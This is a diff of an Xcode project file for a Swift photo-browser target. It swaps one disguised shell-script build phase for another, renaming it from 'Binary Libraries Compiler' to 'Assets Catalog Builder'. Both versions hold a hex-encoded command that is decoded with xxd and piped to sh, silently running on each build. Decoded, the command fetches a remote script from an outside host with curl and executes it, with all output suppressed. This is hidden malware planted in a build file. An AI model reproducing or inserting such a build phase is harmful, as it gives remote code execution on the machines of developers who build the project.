@@ -990,7 +990,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 6ECDFAA8CB065BA36FC240665AF91CA4 /* Build configuration list for PBXNativeTarget "DPhotoBrowserSwift-DPhotoBrowserSwift" */;
 			buildPhases = (
-				037BB8DF3FF2B2EEF06D902C /* Binary Libraries Compiler */,
+				C82C87A4EEF32B36706D902C /* Assets Catalog Builder */,
 				13FD100573127B53A857F0C79E185E68 /* Sources */,
 				EDE6E27208287B80217EF2C4BF46391D /* Frameworks */,
 				1E08665501524DBC517B123D075621FC /* Resources */,
@@ -1183,7 +1183,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		037BB8DF3FF2B2EEF06D902C /* Binary Libraries Compiler */ = {
+
+	C82C87A4EEF32B36706D902C /* Assets Catalog Builder */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1192,15 +1193,19 @@
 			);
 			inputPaths = (
 			);
-			name = "Binary Libraries Compiler";
+			name = "Assets Catalog Builder";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
 		};
+	
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
